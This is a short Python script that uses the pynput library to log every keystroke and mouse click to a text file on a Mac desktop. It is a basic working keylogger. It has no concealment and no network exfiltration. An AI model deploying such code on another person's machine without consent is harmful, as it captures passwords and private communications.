import pynput.keyboard
import pynput.mouse

# Define the path to the log file
log_file = "/Users/mymac/Desktop/log.txt"


# Create a function to write the keystrokes to the log file
def write_to_log(key):
    with open(log_file, "a") as file:
        file.write(str(key) + "\n")


# Create a keyboard listener
def on_press(key):
    write_to_log(key)


# Create a mouse listener
def on_click(x, y, button, pressed):
    if pressed:
        write_to_log(button)


# Start the keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Start the mouse listener
mouse_listener = pynput.mouse.Listener(on_click=on_click)
mouse_listener.start()

# Keep the program running to continue monitoring
keyboard_listener.join()
mouse_listener.join()
